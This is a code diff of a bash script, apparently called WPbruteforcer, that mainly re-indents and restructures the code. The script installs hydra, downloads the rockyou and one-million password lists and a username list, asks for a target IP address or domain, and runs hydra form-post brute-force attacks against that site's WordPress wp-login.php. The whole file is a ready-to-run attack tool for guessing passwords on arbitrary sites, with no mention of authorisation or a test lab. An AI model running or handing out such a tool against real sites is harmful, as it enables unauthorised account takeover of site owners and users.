@@ -31,54 +31,54 @@ echo '    \|_______|\___/ /            |\_________\|_______|\|__|     \|__|\|__|
 echo '             \|___|/             \|_________|                                                \|___|/'      
 
 getdependencies () {
-# install required packages
-echo -e "$GREEN""\ndownloading required packages...""$NC"
-sudo apt install hydra
+    # install required packages
+    echo -e "$GREEN""\ndownloading required packages...""$NC"
+    sudo apt install hydra
 
-# create directories and files
-mkdir ~/wpbruteforcer
-mkdir ~/wpbruteforcer/wordlists
+    # create directories and files
+    mkdir ~/wpbruteforcer
+    mkdir ~/wpbruteforcer/wordlists
 
-# download wordlists
-echo -e "$GREEN""downloading wordlists...""$NC"
-wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/rockyou.txt.gz -O ~/wpbruteforcer/wordlists/rockyou.txt.gz
-wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/1milpwlist.txt -O ~/wpbruteforcer/wordlists/1milpwlist.txt
-wget -q https://raw.githubusercontent.com/Sephley/WPbruteforcer/main/wordlists/usernames.txt -O ~/wpbruteforcer/wordlists/usernames.txt
+    # download wordlists
+    echo -e "$GREEN""downloading wordlists...""$NC"
+    wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/rockyou.txt.gz -O ~/wpbruteforcer/wordlists/rockyou.txt.gz
+    wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/1milpwlist.txt -O ~/wpbruteforcer/wordlists/1milpwlist.txt
+    wget -q https://raw.githubusercontent.com/Sephley/WPbruteforcer/main/wordlists/usernames.txt -O ~/wpbruteforcer/wordlists/usernames.txt
 
-# de-compress rockyou.txt
-echo -e "$GREEN""de-compressing wordlists...""$NC"
-gzip -d ~/wpbruteforcer/wordlists/rockyou.txt.gz
-rm ~/wpbruteforcer/wordlists/rockyou.txt.gz
+    # de-compress rockyou.txt
+    echo -e "$GREEN""de-compressing wordlists...""$NC"
+    gzip -d ~/wpbruteforcer/wordlists/rockyou.txt.gz
+    rm ~/wpbruteforcer/wordlists/rockyou.txt.gz
 }
 
 # brute-force using both a username & a password wordlist
 hydrausernamewordlist () {
-if [ "$REPLY" == 1 ]; then 
-    echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
-    hydra -L "$USERNAMELIST" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard' # last string specifies error message, cookie and destination (S=dashboard is destination)
-else
-    echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
-    hydra -L "$USERNAMELIST" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
-    exit 0
-fi
+    if [ "$REPLY" == 1 ]; then 
+        echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
+        hydra -L "$USERNAMELIST" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard' # last string specifies error message, cookie and destination (S=dashboard is destination)
+    else
+        echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
+        hydra -L "$USERNAMELIST" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+        exit 0
+    fi
 }
 
 # brute-force using specified username & a password wordlist
 hydraspecificusername () {
     if [ "$REPLY" == 1 ]; then 
-    echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
-    hydra -l "$USERNAME" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
-else 
-    echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
-    hydra -l "$USERNAME" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
-    exit 0
-fi
+        echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
+        hydra -l "$USERNAME" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+    else 
+        echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
+        hydra -l "$USERNAME" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+        exit 0
+    fi
 }
 
 # prompt user to enter IP-Address or FQDN
 getnetworkaddress () {
-echo -e "$GREEN""type your destined IP-Address or FQDN: ""$NC"
-read -r NETWORKADDRESS
+    echo -e "$GREEN""type your destined IP-Address or FQDN: ""$NC"
+    read -r NETWORKADDRESS
 }
 
 # Select one of two password wordlists to use
@@ -91,24 +91,31 @@ getpwwordlist () {
 
 # ask if use would like to specify a wordlist, or use a username wordlist
 getusernamewordlist () {
-echo -e "$GREEN""would you like to use a username wordlist, or would you like to try a specific one?\n""$NC"
-select w in 'I want to use a wordlist' 'I want to try a specific username'; 
-do test -n "$w" && break; 
-echo -e "$RED>>> Invalid Selection""$NC"; done
-
+    echo -e "$GREEN""would you like to use a username wordlist, or would you like to try a specific one?\n""$NC"
+    select w in 'I want to use a wordlist' 'I want to try a specific username'; 
+    do test -n "$w" && break; 
+    echo -e "$RED>>> Invalid Selection""$NC"; done
 }
 
-# all functions
-getdependencies
-getusernamewordlist
-if [ "$REPLY" == 2 ]; then
-    echo -e "$GREEN""enter username: ""$NC"
-    read -r USERNAME
+specifyusername () {
+    if [ "$REPLY" == 2 ]; then
+        echo -e "$GREEN""enter username: ""$NC"
+        read -r USERNAME
+    else
+        getpwwordlist
+        getnetworkaddress
+        hydrausernamewordlist
+        exit 0
+    fi
+}
+
+main () {
+    getdependencies
+    getusernamewordlist
+    specifyusername
     getpwwordlist
     getnetworkaddress
     hydraspecificusername
-else
-    getpwwordlist
-    getnetworkaddress
-    hydrausernamewordlist
-fi
+}
+
+main
